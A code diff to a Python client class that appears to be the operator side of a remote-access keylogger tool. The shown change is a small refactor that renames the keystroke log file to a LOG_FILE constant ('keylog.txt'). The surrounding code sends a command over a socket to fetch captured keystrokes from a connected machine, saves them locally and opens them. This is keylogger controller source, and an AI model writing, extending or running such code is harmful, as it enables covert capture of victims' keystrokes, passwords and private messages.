@@ -1,4 +1,3 @@
-from ctypes import WinError
 import socket
 import os
 import time
@@ -26,6 +25,9 @@ BUFFER_SIZE = 1024
 
 # PATH
 TMP_PATH = os.path.join(os.getcwd(), 'tmp')
+
+# LOGGING
+LOG_FILE = "keylog.txt"
 
 
 class Client:
@@ -162,11 +164,11 @@ class Client:
     def save_keylogger(self):
         try:
             if not self.is_connected:
-                os.startfile(os.path.join(TMP_PATH, 'keylogger.txt'))
+                os.startfile(os.path.join(TMP_PATH, LOG_FILE))
             else:
                 self.socket.send(CMD_PRINT_KEYLOGGER.encode())
-                self.save_file(TMP_PATH, 'keylogger.txt', 'wb')
-                os.startfile(os.path.join(TMP_PATH, 'keylogger.txt'))
+                self.save_file(TMP_PATH, LOG_FILE, 'wb')
+                os.startfile(os.path.join(TMP_PATH, LOG_FILE))
                 print("[SUCCESS] Keylogger saved")
                 return "[SUCCESS] Keylogger saved"
         except FileNotFoundError:
